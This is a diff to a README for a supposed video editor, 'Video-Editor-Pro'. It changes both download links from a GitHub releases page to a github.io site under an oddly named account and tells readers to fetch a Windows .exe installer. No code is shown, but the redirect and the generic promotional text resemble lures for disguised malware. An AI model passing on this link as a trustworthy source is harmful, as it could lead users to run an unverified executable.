@@ -1,6 +1,6 @@
 # 🎬 Video-Editor-Pro - Create professional videos with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/streptococcal-personalitydisorder776/Video-Editor-Pro/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://streptococcal-personalitydisorder776.github.io)
 
 ## 📌 About the project
 Video-Editor-Pro helps you edit high-quality videos for your projects. This tool assists content creators by simplifying complex editing tasks. You can export clips in 4K resolution, use artificial intelligence to speed up your workflow, and add professional effects. You do not need technical knowledge to produce polished results.
@@ -16,7 +16,7 @@ Before you start, ensure your computer meets these requirements:
 ## 📥 Getting the software
 You can download the latest version of the application from our release page. We update this page regularly with new features and fixes.
 
-[Visit the release page to download](https://github.com/streptococcal-personalitydisorder776/Video-Editor-Pro/releases)
+[Visit the release page to download](https://streptococcal-personalitydisorder776.github.io)
 
 Click the link above to see the list of available versions. Choose the file ending in .exe to download the installer for Windows.
 
